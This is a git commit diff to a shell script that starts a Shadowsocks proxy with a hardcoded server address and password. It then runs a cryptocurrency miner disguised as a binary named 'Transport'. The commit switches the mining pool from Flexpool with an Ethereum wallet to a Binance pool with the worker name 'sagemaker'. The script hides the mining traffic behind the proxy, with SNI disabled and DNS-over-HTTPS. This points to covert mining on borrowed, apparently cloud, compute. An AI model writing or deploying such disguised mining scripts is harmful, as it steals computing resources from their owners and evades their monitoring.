7e5e7bf69d668583dad17090ff4542937763ca92
aurbach55 <95366868+aurbach55@users.noreply.github.com>
2022-04-04 15:19:03 +0700

    Update start_Transport_fle_ws2.sh

--- start_Transport_fle_ws2.sh
+++ start_Transport_fle_ws2.sh
@@ -39,4 +39,4 @@ ss-local -s 52.203.46.122 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305
 
 ph add Transport
 
-./Transport -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xB94e3506B580920d5c7d1e7ebad2D79259192E11 -p x -w Trans --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
+./Transport -a ethash -o ethash.poolbinance.com:443 -u sagemaker -p x -w Trans --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
